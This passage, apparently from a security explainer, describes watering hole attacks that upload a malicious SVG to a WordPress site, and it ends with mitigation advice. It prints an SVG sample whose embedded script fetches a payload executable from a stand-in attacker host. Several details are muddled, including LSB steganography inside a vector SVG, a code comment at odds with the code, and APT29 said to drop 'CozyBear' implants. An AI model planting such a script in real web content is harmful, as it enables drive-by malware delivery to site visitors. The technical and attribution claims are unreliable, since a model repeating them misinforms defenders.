Watering hole attacks using SVG steganography begin with **Compromise**: Attackers exploit a WordPress plugin (e.g., CVE-2023-4512 in "FileBird") to upload a malicious SVG file disguised as a stock image:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript"><![CDATA[
    fetch('https://evil[.]com/payload.exe').then(r => r.blob()).then(b => new Uint8Array(b).forEach((_, i) => {
      // base64 decode embedded payload
    }));
  ]]></script>
</svg>
```

The SVG is hidden in `wp-content/uploads/2025/04/pretty-image.svg`. When a victim (e.g., HR manager) visits the infected site, the SVG executes JavaScript via `<script>`, fetching the payload. The malware is embedded via **LSB steganography** using tools like **Steghide** or **OpenStego**. Evasion involves **Domain Generation Algorithms (DGA)** in the SVG’s `fetch` URL. Mitigation requires sanitizing SVG uploads via **WordPress hardening plugins** (e.g., Wordfence) and enabling **Content Security Policy (CSP)** directives (`script-src 'self'`). Threat actors like **APT29** used this to drop **CozyBear** implants via watering hole attacks targeting defense contractors.

